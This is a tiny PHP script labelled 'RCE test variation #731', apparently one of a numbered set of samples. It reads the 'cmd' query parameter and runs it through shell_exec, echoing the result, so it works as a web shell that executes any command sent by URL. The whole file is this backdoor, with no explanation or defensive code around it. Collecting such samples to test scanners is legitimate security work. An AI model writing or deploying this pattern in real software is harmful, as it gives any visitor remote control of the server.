<?php
// RCE test variation #731
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>